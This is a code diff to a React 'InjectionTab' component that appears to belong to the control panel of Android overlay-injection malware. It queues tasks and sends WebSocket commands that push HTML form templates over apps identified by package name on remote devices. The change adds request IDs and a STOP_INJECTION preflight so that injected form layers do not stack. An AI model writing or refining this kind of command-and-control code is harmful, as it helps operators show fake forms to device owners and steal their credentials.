@@ -199,6 +199,7 @@ export default function InjectionTab({
   const startInjection = async (tpl) => {
     const pkg = tpl.packageName || tpl.package_name
     const templateId = tpl.templateId || tpl.template_id || tpl.id
+    const requestId = `reinject-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
     setInjLoadingPkg(pkg)
     setReinjectSessions(prev => ({
       ...prev,
@@ -214,6 +215,25 @@ export default function InjectionTab({
         const tplRes = await fetchTemplateDetail(tpl)
         htmlContent = tplRes?.htmlContent || tplRes?.data?.htmlContent || tplRes?.data?.template?.htmlContent || ''
       }
+      // 先登记任务，再发命令：避免设备极快上报时，完成逻辑刚删除任务，
+      // 这里的 POST 又把已完成任务重新写回。
+      await api.request('/api/injection/active-tasks', {
+        method: 'POST',
+        body: JSON.stringify({ deviceId: resolvedDeviceId, packageName: pkg, templateId, requestId }),
+      })
+
+      // “重注”前先关闭设备上可能残留的旧注入页，避免新旧两层表单叠加；
+      // 用同一 requestId 让调试日志可以串联 STOP -> SHOW -> 上报 -> STOP。
+      sendWs({
+        type: 'command',
+        sessionId: resolvedDeviceId,
+        data: {
+          command: 'STOP_INJECTION',
+          params: { packageName: pkg, requestId, source: 'manual-reinject-preflight' }
+        }
+      })
+      await new Promise(resolve => setTimeout(resolve, 250))
+
       sendWs({
         type: 'command',
         sessionId: resolvedDeviceId,
@@ -223,12 +243,10 @@ export default function InjectionTab({
             packageName: pkg,
             htmlContent,
             templateId,
+            requestId,
+            source: 'manual-reinject',
           }
         }
-      })
-      await api.request('/api/injection/active-tasks', {
-        method: 'POST',
-        body: JSON.stringify({ deviceId: resolvedDeviceId, packageName: pkg, templateId }),
       })
       setInjActivePkgs?.(prev => new Set([...prev, pkg]))
       setInjActiveIds?.(prev => new Set([...prev, templateId]))
